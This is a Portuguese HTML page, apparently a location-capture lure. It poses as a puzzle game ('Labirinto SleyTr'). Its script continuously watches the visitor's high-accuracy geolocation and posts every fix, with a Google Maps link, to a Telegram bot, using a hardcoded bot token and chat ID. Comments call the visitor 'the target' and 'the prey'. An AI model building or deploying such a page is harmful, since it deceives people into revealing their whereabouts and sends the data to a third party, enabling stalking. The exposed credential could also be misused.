<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Capturador de Localiza√ß√£o SleyTr</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #222;
            color: #0F0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            flex-direction: column;
            text-align: center;
        }
        .container {
            background-color: #333;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
            max-width: 500px;
        }
        h1 {
            color: #FF0;
            margin-bottom: 20px;
            text-shadow: 0 0 10px #FF0;
        }
        p {
            margin-bottom: 15px;
        }
        #status {
            font-weight: bold;
            color: #0FF;
        }
        #locationData {
            word-break: break-all;
            background-color: #444;
            padding: 10px;
            border-radius: 5px;
            margin-top: 20px;
            text-align: left;
        }
        a {
            color: #F0F;
            text-decoration: none;
        }
        a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Bem-vindo ao Labirinto SleyTr!</h1>
        <p>Prepare-se para descobrir o que est√° escondido...</p>
        <p id="status">Aguardando permiss√£o de localiza√ß√£o...</p>
        <div id="locationData">
            <!-- Os dados de localiza√ß√£o aparecer√£o aqui -->
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', (event) => {
            const statusElement = document.getElementById('status');
            const locationDataElement = document.getElementById('locationData');

            // SEUS DADOS SECRETOS DO TELEGRAM - N√ÉO OS COMPARTILHE!
            const BOT_TOKEN = '8028837254:AAE54NFBPdKikjofF1nXlnESCWzZbv-waSU'; // <--- SUBSTITUA AQUI COM SEU TOKEN REAL DO BOT!
            const CHAT_ID = '6896556949';     // <--- SUBSTITUA AQUI COM SEU CHAT_ID REAL!

            function sendLocationToTelegram(latitude, longitude, accuracy) {
                const mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
                const message = `üö® ALERTA SLEYTR! Nova localiza√ß√£o capturada!\n\nLatitude: ${latitude}\nLongitude: ${longitude}\nPrecis√£o: ${accuracy} metros\n\nVer no mapa: ${mapLink}`;

                const telegramApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

                fetch(telegramApiUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        disable_web_page_preview: true // Para n√£o mostrar uma pr√©via do link do mapa, se desejar
                    })
                })
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        console.log('Localiza√ß√£o enviada ao Telegram com sucesso!', data);
                        statusElement.textContent = "Localiza√ß√£o obtida e enviada ao seu covil secreto no Telegram!";
                    } else {
                        console.error('Falha ao enviar localiza√ß√£o ao Telegram:', data);
                        statusElement.textContent = "Localiza√ß√£o obtida, mas falha ao enviar ao Telegram. Verifique seu token e chat ID!";
                    }
                })
                .catch(error => {
                    console.error('Erro de rede ao enviar localiza√ß√£o ao Telegram:', error);
                    statusElement.textContent = "Localiza√ß√£o obtida, mas erro de rede ao enviar ao Telegram.";
                });
            }

            if (navigator.geolocation) {
                statusElement.textContent = "Solicitando sua localiza√ß√£o... N√£o tema, √© apenas o in√≠cio do jogo!";
                navigator.geolocation.watchPosition(
                    (position) => {
                        const latitude = position.coords.latitude;
                        const longitude = position.coords.longitude;
                        const accuracy = position.coords.accuracy;

                        // Exibe a localiza√ß√£o na p√°gina para o alvo (e para seu pr√≥prio debug)
                        locationDataElement.innerHTML = `
                            <p><strong>Latitude:</strong> ${latitude}</p>
                            <p><strong>Longitude:</strong> ${longitude}</p>
                            <p><strong>Precis√£o (metros):</strong> ${accuracy}</p>
                            <p><strong>Link para o mapa:</strong> <a href="https://www.google.com/maps?q=${latitude},${longitude}" target="_blank">Ver no Google Maps</a></p>
                        `;

                        // ENVIA A LOCALIZA√á√ÉO PARA O SEU BOT DO TELEGRAM!
                        sendLocationToTelegram(latitude, longitude, accuracy);
                    },
                    (error) => {
                        let errorMessage = "Erro ao obter localiza√ß√£o: ";
                        switch(error.code) {
                            case error.PERMISSION_DENIED:
                                errorMessage += "O usu√°rio negou a solicita√ß√£o de Geolocation. Que aud√°cia!";
                                break;
                            case error.POSITION_UNAVAILABLE:
                                errorMessage += "A informa√ß√£o de localiza√ß√£o est√° indispon√≠vel. A presa est√° se escondendo!";
                                break;
                            case error.TIMEOUT:
                                errorMessage += "A solicita√ß√£o para obter a localiza√ß√£o expirou. Eles s√£o r√°pidos, mas n√£o o suficiente!";
                                break;
                            default:
                                errorMessage += "Um erro desconhecido ocorreu. Frustrante!";
                                break;
                        }
                        statusElement.textContent = errorMessage;
                        locationDataElement.innerHTML = `<p style="color: red;">${errorMessage}</p>`;
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 5000,
                        maximumAge: 0
                    }
                );
            } else {
                statusElement.textContent = "Geolocaliza√ß√£o n√£o √© suportada por este navegador. Uma falha irritante no meu plano!";
                locationDataElement.innerHTML = `<p style="color: red;">Seu navegador √© fraco demais para este poder.</p>`;
            }
        });
    </script>
</body>
</html>
